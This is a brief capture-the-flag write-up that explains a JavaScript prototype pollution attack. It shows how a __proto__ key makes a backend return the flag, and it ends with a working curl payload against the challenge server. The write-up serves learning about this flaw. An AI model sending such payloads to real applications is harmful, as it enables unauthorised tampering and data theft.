This is a prototype pollution attack in javascript.

__proto__
In JavaScript, every object inherits from Object.prototype. By assigning __proto__ we are modifying the entire object prototype chain.
This line:

data[&quot;__proto__&quot;][&quot;note&quot;] = flag;
Is equivalent to:
Object.prototype.note = flag;
What did the back end do:
resText = new dataSet(data);
res.send(&quot;Here&#039;s your note: &quot; + resText[&quot;note&quot;]);
The dataSet class does this:
this.note = data[&quot;block1&quot;][&quot;note&quot;];
But since data[&quot;block1&quot;][&quot;note&quot;]; was never explicitly set, JavaScript fell back to the prototype and saw:
Object.prototype.note = flag;
this.note === flag
So:
curl -X POST -d &#039;key=__proto__&amp;key2=note&#039; ctf.hackademics-forum.com:14527/data  
